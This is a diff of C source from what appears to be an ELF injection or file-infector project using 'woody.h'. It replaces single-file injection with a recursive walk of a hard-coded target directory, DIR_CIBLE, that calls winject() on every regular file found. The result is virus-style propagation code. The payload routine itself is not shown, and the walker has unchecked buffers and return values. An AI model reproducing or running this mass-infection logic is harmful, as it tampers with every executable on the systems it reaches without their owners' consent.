@@ -1,12 +1,17 @@
 #include <sys/mman.h>
 #include <sys/stat.h>
 
+#include <sys/types.h>
+#include <sys/stat.h>
+
 #include <fcntl.h>
 #include <unistd.h>
 #include <stdlib.h>
 
 #include <stdio.h>
 #include <stdint.h>
+
+#include <dirent.h>
 
 #include "libft.h"
 #include "woody.h"
@@ -162,7 +167,7 @@ fail_corrupt:
 fail_vmap:
 	close(fdv);
 fail_open:
-	return -1;
+	return 1;
 }
 
 void
@@ -249,20 +254,44 @@ fail:
 	return -1;
 }
 
-int
-main(int ac, char **av)
+void exe_dir(char *cible, int len)
 {
-	(void)ac;
-
-
+	
 	WFILE w;
-	if (wopen(av[1], &w))
-		goto fail;
+        struct dirent *pd;
+	struct stat statb;
+        DIR     *pdir;
 
-	int ret = winject(&w);
-	printf((!ret)?"SUCCESS\n" : (ret == 1) ? "OK\n" : "ERROR\n");
+	*(cible + len++) = '/';
+	*(cible + len) = '\0';
+	
+        pdir = opendir(cible);
+        while ((pd = readdir(pdir)))
+        {
+		if (*(pd->d_name) == '.' && (*(pd->d_name + 1) == '\0' ||
+		(*(pd->d_name + 1) == '.' && *(pd->d_name + 2) == '\0')))
+			continue ;
+		strcpy(cible + len, pd->d_name);
+		stat(cible, &statb);
+		if (S_ISDIR(statb.st_mode))
+		{
+			exe_dir(cible, len + strlen(pd->d_name));
+		}
+		else if (S_ISREG(statb.st_mode) && !wopen(cible, &w))
+		{
+			int ret = winject(&w);
+			printf((!ret)?"SUCCESS\n" : (ret == 1) ? "OK\n" : "ERROR\n");
+		}
+        }
+        closedir (pdir);
+}
 
-	return 0;
-fail:
+int
+main(void)
+{
+	char	cible[FILENAME_MAX];
+
+	strcpy(cible, DIR_CIBLE);
+	exe_dir(cible, strlen(DIR_CIBLE));
 	return 1;
 }
